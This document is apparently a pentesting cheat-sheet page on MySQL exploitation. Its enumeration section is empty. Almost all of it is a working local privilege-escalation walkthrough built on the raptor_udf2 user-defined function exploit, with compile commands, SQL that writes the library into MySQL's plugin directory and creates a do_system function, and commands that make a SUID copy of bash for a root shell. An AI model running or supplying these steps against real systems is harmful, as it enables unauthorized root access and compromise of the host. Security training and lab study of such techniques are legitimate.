---
description: Exploitation and enumeration
---

# MySQL

## Enumeration



## Exploitation

### User Defined Functions Dynamic Library

The raptor\_udf2.c from [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518) can be used for local privilege escalation through MySQL run with root privileges.&#x20;

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Login to mysql using the username and password. Then run these:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

Exit out of the MySQL shell (type exit or \q and press Enter) and run the `/tmp/rootbash` executable with -p to gain a shell running with root privileges:

```bash
/tmp/rootbash -p
```





